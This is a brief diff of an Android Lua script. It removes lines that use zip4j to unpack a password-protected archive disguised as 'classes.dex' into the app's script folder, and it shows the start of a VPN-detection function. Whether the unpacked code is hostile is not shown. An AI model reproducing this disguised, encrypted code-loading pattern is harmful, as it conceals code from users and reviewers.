@@ -4,10 +4,6 @@ import "android.os.*"
 import "android.widget.*"
 import "android.view.*"
 
-import "zip4j"
-zip4j.unZipDir(activity.getLuaDir("/libs/classes.dex"),
-activity.getLuaDir(""),"FC6WH7wg_Y!R-$c9R@KJYAAf5=P5acvQg-j_^JT+SJTj37c9Pu#$f7Kr87n78XeF4v-e26kCgApz9_7m?hj9b=P=&!p43abQx^Ew")
-
 local function isVpnUsed()
   import "java.net.NetworkInterface"
   import "java.util.Collections"
